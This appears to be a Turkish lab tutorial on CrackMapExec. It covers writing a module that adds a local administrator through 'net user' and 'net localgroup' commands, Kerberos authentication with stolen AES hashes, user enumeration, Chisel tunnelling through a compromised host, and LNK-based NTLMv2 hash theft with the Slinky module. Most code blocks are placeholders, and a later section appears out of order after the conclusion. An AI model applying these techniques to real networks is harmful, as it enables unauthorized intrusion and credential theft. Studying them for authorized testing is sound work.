Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

